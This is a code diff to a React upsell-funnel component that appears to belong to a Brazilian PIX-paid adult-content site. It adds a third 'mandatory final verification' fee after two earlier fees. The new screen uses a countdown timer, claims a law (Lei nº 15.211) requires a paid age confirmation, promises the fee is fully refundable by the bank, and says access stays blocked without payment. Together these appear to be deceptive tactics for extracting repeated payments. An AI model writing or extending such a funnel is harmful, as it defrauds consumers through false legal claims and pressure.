@@ -8,7 +8,7 @@ interface Props {
   onClose: () => void
 }
 
-type FunnelStep = 'upsell1' | 'upsell2' | 'final'
+type FunnelStep = 'upsell1' | 'upsell2' | 'upsell3' | 'final'
 type QrStep = 'offer' | 'loading' | 'qr'
 
 interface PixData {
@@ -58,6 +58,7 @@ export default function UpsellFunnel({ onClose }: Props) {
 
   const u1Total = 6.5 + (extra1 ? 7 : 0)
   const u2Total = 12.53 + (extra2 ? 14 : 0)
+  const u3Total = 12.9 // Verificação Final Obrigatória (sem order bump)
 
   useEffect(() => {
     document.body.style.overflow = 'hidden'
@@ -73,8 +74,17 @@ export default function UpsellFunnel({ onClose }: Props) {
   useEffect(() => {
     if (funnel === 'upsell1') trackFunnel('upsell1_view')
     else if (funnel === 'upsell2') trackFunnel('upsell2_view')
+    else if (funnel === 'upsell3') trackFunnel('upsell3_view')
     else if (funnel === 'final') trackFunnel('funnel_complete')
   }, [funnel])
+
+  // Config de cada taxa (upsell). Mantém o tracking e as transições
+  // em um único lugar — fácil adicionar/editar etapas.
+  const STEP = {
+    upsell1: { value: u1Total, cid: 'upsell-verificacao', cname: 'Verificação Obrigatória', paid: 'upsell1_paid' as const, next: 'upsell2' as FunnelStep },
+    upsell2: { value: u2Total, cid: 'upsell-liberacao', cname: 'Taxa de Liberação de Uso', paid: 'upsell2_paid' as const, next: 'upsell3' as FunnelStep },
+    upsell3: { value: u3Total, cid: 'upsell-final', cname: 'Verificação Final Obrigatória', paid: 'upsell3_paid' as const, next: 'final' as FunnelStep },
+  }
 
   useEffect(() => {
     if (qrStep !== 'qr' || !pixData) return
@@ -86,21 +96,22 @@ export default function UpsellFunnel({ onClose }: Props) {
           clearInterval(pollRef.current!)
 
           // Purchase separado para cada taxa
-          const isU1 = funnel === 'upsell1'
-          trackEvent({
-            event: 'Purchase',
-            value: isU1 ? u1Total : u2Total,
-            content_id: isU1 ? 'upsell-verificacao' : 'upsell-liberacao',
-            content_name: isU1 ? 'Verificação Obrigatória' : 'Taxa de Liberação de Uso',
-            order_id: pixData?.id,
-            event_id: pixData ? `purchase_${pixData.id}` : undefined,
-          })
-          trackFunnel(isU1 ? 'upsell1_paid' : 'upsell2_paid')
-          if (isU1 && extra1) trackFunnel('bump_whatsapp')   // order bump U1
-          if (!isU1 && extra2) trackFunnel('bump_calcinha')  // order bump U2
+          const cfg = STEP[funnel as 'upsell1' | 'upsell2' | 'upsell3']
+          if (cfg) {
+            trackEvent({
+              event: 'Purchase',
+              value: cfg.value,
+              content_id: cfg.cid,
+              content_name: cfg.cname,
+              order_id: pixData?.id,
+              event_id: pixData ? `purchase_${pixData.id}` : undefined,
+            })
+            trackFunnel(cfg.paid)
+            if (funnel === 'upsell1' && extra1) trackFunnel('bump_whatsapp')   // order bump U1
+            if (funnel === 'upsell2' && extra2) trackFunnel('bump_calcinha')  // order bump U2
 
-          if (funnel === 'upsell1') { setFunnel('upsell2'); setQrStep('offer'); setPixData(null) }
-          else if (funnel === 'upsell2') { setFunnel('final'); setQrStep('offer'); setPixData(null) }
+            setFunnel(cfg.next); setQrStep('offer'); setPixData(null)
+          }
         }
       } catch {}
     }, 3000)
@@ -121,11 +132,11 @@ export default function UpsellFunnel({ onClose }: Props) {
       setQrStep('qr')
 
       // InitiateCheckout para cada taxa
-      const isU1 = funnel === 'upsell1'
+      const cfg = STEP[funnel as 'upsell1' | 'upsell2' | 'upsell3']
       trackEvent({
         event: 'InitiateCheckout',
         value: amount,
-        content_id: isU1 ? 'upsell-verificacao' : 'upsell-liberacao',
+        content_id: cfg ? cfg.cid : 'upsell',
         content_name: description,
         order_id: data.transaction.id,
       })
@@ -319,6 +330,57 @@ export default function UpsellFunnel({ onClose }: Props) {
                     className="w-full bg-gradient-to-r from-pink-600 to-pink-400 text-white font-black text-sm py-3.5 rounded-2xl flex items-center justify-center gap-2 shadow-lg shadow-pink-200/60 active:scale-[0.98] transition-transform disabled:opacity-70"
                   >
                     {qrStep === 'loading' ? 'Gerando PIX...' : 'Ativar liberação de uso ✅'}
+                  </button>
+                  <Footer />
+                </div>
+              )
+            }
+          </>
+        )}
+
+        {/* ── UPSELL 3: Verificação Final Obrigatória (Lei Felca) ── */}
+        {funnel === 'upsell3' && (
+          <>
+            <TimerBar label="Tempo restante:" />
+            <div className="bg-gradient-to-r from-red-600 to-red-500 px-5 pt-4 pb-4 text-center">
+              <p className="text-3xl mb-1">⚠️</p>
+              <h2 className="text-white text-lg font-black mb-0.5">Verificação Final Obrigatória</h2>
+              <p className="text-white/80 text-xs">Seu dispositivo foi validado com sucesso ✅</p>
+            </div>
+
+            {qrStep === 'qr'
+              ? <QRScreen accentClass="text-red-500" />
+              : (
+                <div className="bg-white px-5 pt-4 pb-5">
+                  <img
+                    src="/media/anexo_1.jpg"
+                    alt="Aviso Lei Felca"
+                    className="w-full rounded-xl mb-3 border border-gray-200"
+                    onError={(e) => { (e.currentTarget as HTMLImageElement).style.display = 'none' }}
+                  />
+                  <p className="text-sm text-gray-700 mb-3 leading-relaxed">
+                    Para liberar seu acesso <strong>+18</strong>, o sistema exige uma última
+                    confirmação de maioridade conforme protocolo da <strong>Lei Felca
+                    (Lei nº 15.211)</strong>.<br />
+                    Essa ativação vincula seu aparelho ao acesso privado e impede
+                    compartilhamentos, vazamentos e bloqueios automáticos do sistema.
+                  </p>
+                  <ul className="space-y-1.5 mb-3">
+                    {['Liberação imediata do VIP', 'Acesso privado e sigiloso', 'Proteção contra bloqueios', 'Conteúdos ocultos liberados 🔥', 'Taxa 100% reembolsável pelo banco em até 7 dias úteis'].map((b) => (
+                      <li key={b} className="flex items-center gap-2 text-sm text-gray-700"><Check />{b}</li>
+                    ))}
+                  </ul>
+                  <p className="text-center text-xs text-gray-500 mb-0.5">💎 Taxa simbólica de ativação:</p>
+                  <p className="text-center font-black text-red-500 text-4xl mb-3">R$ {fmt(u3Total)}</p>
+                  <div className="border border-red-200 bg-red-50 rounded-xl px-3 py-2 mb-3 text-center">
+                    <p className="text-xs text-red-700 font-semibold">⏳ Sem essa confirmação, seu acesso permanece bloqueado.</p>
+                  </div>
+                  <button
+                    onClick={() => pay(u3Total, 'Verificação Final Obrigatória')}
+                    disabled={qrStep === 'loading'}
+                    className="w-full bg-gradient-to-r from-red-600 to-red-500 text-white font-black text-sm py-3.5 rounded-2xl flex items-center justify-center gap-2 shadow-lg shadow-red-200/60 active:scale-[0.98] transition-transform disabled:opacity-70"
+                  >
+                    {qrStep === 'loading' ? 'Gerando PIX...' : 'Confirmar maioridade e liberar acesso ✅'}
                   </button>
                   <Footer />
                 </div>
